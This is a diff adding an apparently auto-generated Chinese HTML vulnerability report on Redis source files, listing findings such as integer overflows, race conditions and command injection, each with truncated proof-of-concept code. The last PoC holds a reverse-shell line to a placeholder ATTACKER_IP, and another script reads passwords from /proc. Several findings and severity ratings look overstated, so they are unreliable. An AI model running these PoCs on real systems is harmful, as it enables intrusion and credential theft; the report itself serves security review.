+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 拒绝服务攻击，通过耗尽系统内存使Lua解释器崩溃；2) 在32位系统上可能触发整数溢出，导致分配远小于预期大小的内存，进而可能被利用为缓冲区溢出；3) 影响所有使用Lua字节码加载器的应用，包括Redis、Nginx等；4) 攻击者可以通过构造恶意字节码文件，在目标系统上造成内存耗尽或进程崩溃</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-7B107532 - Lua字节码整数溢出/内存分配过大漏洞
+仅供安全研究使用
+&quot;&quot;&quot;
+
+import struct
+import sys
+
+def create_malicious_luac(output_file):
+    &quot;&quot;&quot;
+    构造恶意Lua字节码文件，触发LoadCode中的整数溢出
+    
+    原理：
+    - LoadInt只检查n&lt;0，不检查上界
+    - 提供极大正整数(如0x7FFFFFFF)导致luaM_newvector分配巨大内存
+    - sizeof(Instruction)=4字节，n*4可能溢出size_t
+    &quot;&quot;&quot;
+    
+    # Lua 5.1 头部签名
+    LUA_SIGNATURE = b&#x27;\x1bLua&#x27;
+    LUAC_VERSION = 0x51  # Lua 5.1
+    </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-84C00D59 - 空指针解引用</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> modules\vector-sets\fastjson.c:155</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>exprtoken *t = exprNewToken(EXPR_TOKEN_STR);
+
+if (!has_esc) {
+    t-&gt;str.start = (char*)start; t-&gt;str.len = len; t-&gt;str.heapstr = NULL;
+} else {
+    char *dst = RedisModule_Alloc(len + 1);
+    t-&gt;str.start = t-&gt;str.heapstr = dst; t-&gt;str.len = len;</code></pre>
+                <p><strong>数据流:</strong> exprNewToken函数可能返回NULL，但返回值未被检查就直接使用。</p>
+                <p><strong>判断理由:</strong> 函数exprNewToken可能因为内存分配失败等原因返回NULL，但代码没有检查返回值就直接访问t-&gt;str成员，可能导致空指针解引用和程序崩溃。</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过耗尽Redis进程内存，触发空指针解引用漏洞，导致Redis进程崩溃，造成拒绝服务(DoS)。由于该漏洞位于JSON解析的核心函数中，任何需要解析JSON数据的操作都可能触发此漏洞。在Redis集群环境中，单个节点崩溃可能导致整个集群不可用。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供安全研究使用
+ * 漏洞: 空指针解引用 (Null Pointer Dereference)
+ * 文件: modules/vector-sets/fastjson.c
+ * 行号: 155
+ * 
+ * 此PoC演示了通过触发内存压力导致exprNewToken返回NULL，
+ * 进而导致空指针解引用和程序崩溃。
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/resource.h&gt;
+#include &lt;signal.h&gt;
+
+/* 模拟exprNewToken函数 - 在内存压力下返回NULL */
+typedef struct {
+    int type;
+    struct {
+        char *start;
+        size_t len;
+        char *heapstr;
+    } str;
+} exprtoken;
+
+#define EXP</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-300C1B17 - 并发竞争条件 - 线程安全漏洞</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> modules\vector-sets\vset.c:1</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>/* ... threading model documentation ... */
+
+struct vsetObject {
+    HNSW *hnsw;
+    RedisModuleDict *dict;
+    float *proj_matrix;
+    uint32_t proj_input_size;
+    pthread_rwlock_t in_use_lock;
+    uint64_t id;
+    uint64_t numattribs;
+    atomic_int thread_creation_pending;
+};</code></pre>
+                <p><strong>数据流:</strong> 文档中描述了多个线程安全问题和竞态条件：
+1. 从创建线程到线程实际获取锁之间存在时间窗口，在此期间DEL/expire可能触发并删除对象
+2. 使用原子计数器保护对象，但文档承认存在潜在问题
+3. 主线程中的读操作（VCARD, VEMB, VRANDMEMBER等）不获取任何锁
+4. 后台线程修改读槽元数据（node-&gt;visited_epoch[slot]）</p>
+                <p><strong>判断理由:</strong> 代码文档明确描述了多个竞态条件问题：
+1. 线程创建和锁获取之间的时间窗口可能导致对象被删除后线程仍在访问
+2. 主线程读操作不获取锁，可能读取到后台线程正在修改的不一致数据
+3. 文档承认当前解决方案存在潜在问题，并讨论了替代方案但未实施
+4. 虽然文档声称某些操作是安全的，但这种依赖复杂时序假设的设计容易引入难以发现的bug</p>
+                <p><strong>影响分析:</strong> 成功利用此竞态条件可能导致：1) 后台线程访问已删除的对象，导致程序崩溃或内存损坏；2) 读操作读取到不一致的数据，返回错误结果；3) 原子计数器保护机制失效，导致对象被错误释放；4) 在极端情况下可能导致远程代码执行或数据泄露。由于这是设计层面的缺陷，修复需要重构线程安全模型。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-300C1B17 - Vector Sets Thread Safety Race Condition
+仅供研究使用 - For Research Purposes Only
+
+This PoC demonstrates the race condition between thread creation and object deletion.
+&quot;&quot;&quot;
+
+import redis
+import threading
+import time
+import random
+
+# 前置条件：需要Redis实例加载了vector-sets模块
+REDIS_HOST = &#x27;localhost&#x27;
+REDIS_PORT = 6379
+
+def exploit_race_condition():
+    &quot;&quot;&quot;
+    利用线程创建与锁获取之间的时间窗口
+    通过并发执行DEL和VSIM操作来触发竞态条件
+   </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-30FAF02F - 整数溢出/缓冲区溢出</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> src\mstr.c:37</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>assert(lenStr + mstrHdr + 1 &gt; lenStr); /* Catch size_t overflow */</code></pre>
+                <p><strong>数据流:</strong> 用户控制的lenStr参数 -&gt; mstrNew函数 -&gt; 加法运算 -&gt; assert检查</p>
+                <p><strong>判断理由:</strong> 使用assert进行整数溢出检查存在严重问题。在Release构建中assert会被移除，导致整数溢出检查完全失效。当lenStr接近SIZE_MAX时，加法运算可能溢出，导致分配的内存远小于预期，后续memcpy操作会造成堆缓冲区溢出。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致堆缓冲区溢出，攻击者可以：1) 覆盖相邻堆块数据，导致程序崩溃（DoS）；2) 精心构造堆布局后，可能实现任意代码执行（ACE）；3) 由于该代码是Redis的依赖库，影响范围可能扩展到所有使用该库的Redis实例和相关应用。CVSS评分预计为9.8（Critical），因为攻击向量为网络远程，无需认证，且可能导致完全的系统控制。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-30FAF02F - Integer Overflow in mstrNew()
+ * 仅供研究使用 - For Research Purposes Only
+ * 
+ * 编译命令: gcc -O2 -DNDEBUG -o poc_mstr_overflow poc_mstr_overflow.c -I./src
+ * 注意: -DNDEBUG 模拟Release构建，禁用assert
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;assert.h&gt;
+
+/* 模拟目标库的头文件引用 */
+/* 实际利用时需要链接目标库 */
+
+/* 模拟mstr.h中的关键定义 */
+#define NULL_SIZE 1
+#define MSTR_TYPE_5 0
+#define MSTR_TYPE_8 1
+#define MSTR_TYPE_16 2
+#def</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-C698F6B7 - 整数溢出</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> src\mstr.c:82</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>size_t allocLen = sumMetaLen + sizeof(mstrFlags) + mstrHdr + lenStr + NULL_SIZE;</code></pre>
+                <p><strong>数据流:</strong> 用户控制的lenStr和kind参数 -&gt; mstrNewWithMeta函数 -&gt; 多个加法运算</p>
+                <p><strong>判断理由:</strong> 在mstrNewWithMeta函数中，多个size_t值相加没有进行溢出检查。如果lenStr、sumMetaLen等值过大，加法运算可能溢出，导致分配的内存不足，后续memcpy操作会写入超出分配内存的范围。</p>
+                <p><strong>影响分析:</strong> 该整数溢出漏洞可导致堆缓冲区溢出，攻击者通过精心构造的lenStr和metaFlags参数，可使allocLen计算溢出为很小的值，导致分配的内存远小于实际需要。后续memcpy操作使用原始的lenStr值进行拷贝，会写入超出分配内存的范围，覆盖堆上的其他数据。成功利用可导致：1) 远程代码执行 - 覆盖函数指针或返回地址；2) 信息泄露 - 读取堆上的敏感数据；3) 拒绝服务 - 破坏堆结构导致程序崩溃。由于该漏洞位于字符串处理库中，影响范围广泛，任何使用该库的应用程序都可能受到影响。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供安全研究使用
+ * 漏洞: VULN-C698F6B7 - mstrNewWithMeta整数溢出
+ * 目标: 展示通过整数溢出导致堆缓冲区溢出的利用路径
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+
+/* 模拟mstr库中的关键结构体和函数 */
+typedef unsigned char mstrFlags;
+typedef struct {
+    int dummy;
+} mstrKind;
+
+#define NULL_SIZE 1
+#define MSTR_TYPE_5 0
+#define MSTR_TYPE_8 1
+#define MSTR_TYPE_16 2
+#define MSTR_TYPE_64 3
+
+/* 模拟mstrHdrSize函数 */
+static inline int mstrHdrSize(char type) {
+    switch(type) {</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #28a745;">
+                <h3>VULN-9DABAFCA - 硬编码凭证 / 敏感信息泄露</h3>
+                <span class="severity" style="background:#28a745;color:white;padding:2px 8px;border-radius:3px;">LOW</span>
+                <p><strong>文件:</strong> src\redis-benchmark.c:1</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>代码片段中未直接显示硬编码凭证，但 `config.conn_info.auth` 字段用于存储认证密码。如果该密码来自命令行参数（如 `-a`），它可能会在进程列表（`/proc/self/cmdline`）中暴露给其他用户。</code></pre>
+                <p><strong>数据流:</strong> 命令行参数 `-a &lt;password&gt;` -&gt; `config.conn_info.auth`。在 Unix 系统中，任何用户都可以读取 `/proc/&lt;pid&gt;/cmdline` 文件，从而获取密码。</p>
+                <p><strong>判断理由:</strong> 这是一个常见的信息泄露问题。虽然不算是代码本身的漏洞，但属于安全配置问题。建议通过环境变量或配置文件传递敏感信息，或者使用 `getpass()` 等函数从终端读取密码，避免在命令行中明文传递。</p>
+                <p><strong>影响分析:</strong> 本地低权限用户可以通过读取/proc文件系统获取redis-benchmark进程的命令行参数，从而获得Redis服务器的认证密码。这可能导致：1) 未授权访问Redis服务器；2) 数据泄露或篡改；3) 横向移动攻击。虽然漏洞严重性较低（需要本地访问权限），但在多用户系统或容器环境中风险较高。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - Redis Benchmark密码泄露PoC
+# 此PoC演示如何通过/proc文件系统获取redis-benchmark进程的认证密码
+
+echo &quot;[*] Redis Benchmark密码泄露PoC (仅供研究使用)&quot;
+echo &quot;&quot;
+
+# 步骤1: 查找正在运行的redis-benchmark进程
+BENCHMARK_PIDS=$(pgrep -x &quot;redis-benchmark&quot; 2&gt;/dev/null)
+
+if [ -z &quot;$BENCHMARK_PIDS&quot; ]; then
+    echo &quot;[-] 未找到正在运行的redis-benchmark进程&quot;
+    echo &quot;[*] 请先启动redis-benchmark: redis-benchmark -a your_secret_password -h 127.0.0.1 -p 6379 -n 1000&quot;
+    exit 1
+fi
+
+echo &q</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-397B7D3A - 信号处理程序不安全</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src/redis-check-rdb.c:130</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>void rdbCheckHandleCrash(int sig, siginfo_t *info, void *secret) {
+    UNUSED(sig);
+    UNUSED(info);
+    UNUSED(secret);
+    rdbCheckError(&quot;Server crash checking the specified RDB file!&quot;);
+    exit(1);
+}</code></pre>
+                <p><strong>数据流:</strong> 信号触发 -&gt; 信号处理函数 -&gt; rdbCheckError -&gt; printf -&gt; exit</p>
+                <p><strong>判断理由:</strong> 信号处理函数中调用了printf和exit，这些函数不是异步信号安全的。在信号处理上下文中调用非异步信号安全函数可能导致死锁、数据损坏或安全漏洞。正确的做法是使用write()等异步信号安全函数。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过构造特定的损坏RDB文件，触发不安全的信号处理函数。在信号处理上下文中调用非异步信号安全函数（printf和exit）可能导致：1) 死锁 - 如果信号发生时程序持有锁，printf可能尝试获取同一锁；2) 数据损坏 - printf内部缓冲区状态可能被破坏；3) 信息泄露 - 错误信息可能包含敏感内存内容；4) 拒绝服务 - exit可能导致资源未正确释放。虽然直接利用难度较高，但在特定并发场景下可能造成安全影响。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-397B7D3A - 信号处理程序不安全
+仅供研究使用
+
+漏洞描述：
+在 redis-check-rdb.c 中，信号处理函数 rdbCheckHandleCrash 调用了 rdbCheckError，
+而 rdbCheckError 内部使用了 printf 和 exit，这些函数不是异步信号安全的。
+在信号处理上下文中调用非异步信号安全函数可能导致死锁、数据损坏或安全漏洞。
+
+利用原理：
+通过构造一个特定的损坏RDB文件，当 redis-check-rdb 尝试解析该文件时，
+会触发 SIGSEGV 信号，进而调用不安全的信号处理函数。
+在特定条件下（如信号处理期间主程序持有锁），printf 和 exit 可能导致死锁或未定义行为。
+&quot;&quot;&quot;
+
+import struct
+import os
+import sys
+import tempfile
+import subprocess
+
+# 仅供研究使用
+print(&quot;=&quot; *</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-6388ECCD - 整数溢出/缓冲区溢出</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> src/zipmap.c:200</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>unsigned char *zipmapSet(unsigned char *zm, unsigned char *key, unsigned int klen, unsigned char *val, unsigned int vlen, int *update) {
+    unsigned int zmlen, offset;
+    unsigned int freelen, reqlen = zipmapRequiredLength(klen,vlen);
+    unsigned int empty, vempty;
+    unsigned char *p;
+    freelen = reqlen;
+    if (update) *update = 0;
+    p = zipmapLookupRaw(zm,key,klen,&amp;zmlen);
+    if (p == NULL) {
+        /* Key not found: enlarge */
+        zm = zipmapResize(zm, zmlen+reqlen);
+        p = zm+zmlen-1;
+        zmlen = zmlen+reqlen;</code></pre>
+                <p><strong>数据流:</strong> 用户控制的klen和vlen -&gt; zipmapRequiredLength计算reqlen -&gt; zmlen+reqlen用于内存分配</p>
+                <p><strong>判断理由:</strong> zmlen和reqlen都是unsigned int，zmlen+reqlen可能溢出。如果溢出，zipmapResize会分配一个很小的缓冲区，但后续操作会写入大量数据，导致堆缓冲区溢出。这是最危险的漏洞点，因为zipmapSet是外部可调用的函数。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致堆缓冲区溢出，可能造成Redis服务崩溃（拒绝服务），或在特定条件下实现远程代码执行。由于Redis常用于缓存、会话存储等关键服务，攻击者可导致服务不可用或进一步渗透内网。CVSS评分预计为9.8（Critical），因为攻击复杂度低，无需认证，且可远程触发。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-6388ECCD - Integer Overflow in zipmapSet
+Redis zipmap integer overflow leading to heap buffer overflow
+
+仅供研究使用 - For research purposes only
+&quot;&quot;&quot;
+
+import socket
+import struct
+import sys
+
+# Redis RESP protocol helpers
+def redis_encode_array(*args):
+    &quot;&quot;&quot;Encode Redis command as RESP array&quot;&quot;&quot;
+    parts = [f&quot;*{len(args)}\r\n&quot;]
+    for arg in args:
+        if isinstance(arg, bytes):
+         </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-2E5901D5 - 不安全的线程分离</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src\modules\helloblock.c:93</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if (pthread_create(&amp;tid,NULL,HelloBlock_ThreadMain,targ) != 0) {</code></pre>
+                <p><strong>数据流:</strong> 用户输入delay和timeout -&gt; HelloBlock_RedisCommand -&gt; 创建线程执行HelloBlock_ThreadMain</p>
+                <p><strong>判断理由:</strong> 创建的线程(pthread_t tid)没有被分离(pthread_detach)或连接(pthread_join)，导致线程资源泄漏。每次调用hello.block命令都会创建一个新线程，但线程结束后资源不会被回收，长期运行可能导致资源耗尽。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过重复调用hello.block命令，每次创建一个未分离的pthread线程。这些线程在完成任务后不会被回收，导致线程资源持续泄漏。长期运行可能导致：1) 系统线程数达到上限，无法创建新线程；2) 内存资源耗尽；3) Redis服务器性能下降或崩溃；4) 拒绝服务(DoS)攻击。虽然每个线程在sleep后会自动结束，但pthread_t结构体和相关资源不会被回收，直到进程终止。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - Redis HelloBlock模块线程泄漏PoC
+# 作者: 安全研究人员
+# 日期: 2024
+# 描述: 演示通过重复调用hello.block命令导致线程资源耗尽
+
+# 配置
+REDIS_HOST=&quot;127.0.0.1&quot;
+REDIS_PORT=6379
+REDIS_CLI=&quot;redis-cli -h $REDIS_HOST -p $REDIS_PORT&quot;
+
+# 检查模块是否已加载
+echo &quot;[+] 检查HelloBlock模块是否已加载...&quot;
+MODULE_CHECK=$($REDIS_CLI MODULE LIST 2&gt;/dev/null | grep -c &quot;helloblock&quot;)
+if [ &quot;$MODULE_CHECK&quot; -eq 0 ]; then
+    echo &quot;[-] HelloBlock模块未加载，请先加载模块&quot;
+    echo &quot;    加载命令: redis-cli MO</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-84B1FB85 - 命令注入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> utils/generate-commands-json.py:101</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>p = subprocess.Popen([args.cli, &#x27;-h&#x27;, args.host, &#x27;-p&#x27;, str(args.port), &#x27;--json&#x27;, &#x27;command&#x27;, &#x27;docs&#x27;], stdout=subprocess.PIPE)</code></pre>
+                <p><strong>数据流:</strong> 用户通过命令行参数--cli、--host、--port传入参数 -&gt; args.cli、args.host、args.port -&gt; 直接作为subprocess.Popen的参数执行</p>
+                <p><strong>判断理由:</strong> 与第97行相同，args.cli参数直接用于构造subprocess.Popen的命令路径，攻击者可以通过--cli参数指定任意可执行文件路径，导致任意命令执行。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过--cli参数指定任意可执行文件路径，并通过--host参数传递恶意参数，实现任意命令执行。攻击者可以：1) 执行系统命令（如id、whoami）；2) 创建/删除文件；3) 建立反向shell；4) 读取敏感文件（如/etc/passwd）；5) 执行持久化操作。由于该脚本通常由开发者在构建过程中使用，攻击者可能通过供应链攻击或内部网络渗透利用此漏洞，获得对构建系统的完全控制。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 命令注入漏洞PoC
+# 漏洞文件: utils/generate-commands-json.py
+# 漏洞行: 101 (subprocess.Popen调用)
+
+# PoC 1: 通过--cli参数执行任意命令
+# 利用方式: 将--cli设置为/bin/sh，通过--host传递恶意参数
+python3 utils/generate-commands-json.py \
+    --cli /bin/sh \
+    --host &#x27;-c &quot;echo PWNED; id; whoami; touch /tmp/pwned&quot;&#x27; \
+    --port 6379
+
+# PoC 2: 执行反向shell
+# python3 utils/generate-commands-json.py \
+#     --cli /bin/sh \
+#     --host &#x27;-c &quot;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&</code></pre></details>
+            </div>
+
+    <hr>
+    <p style="color:#666;font-size:0.9em;">报告由 CodeSentinel 自动生成 | 2026-07-11 17:50:05</p>
+</div>
+</body>
+</html>
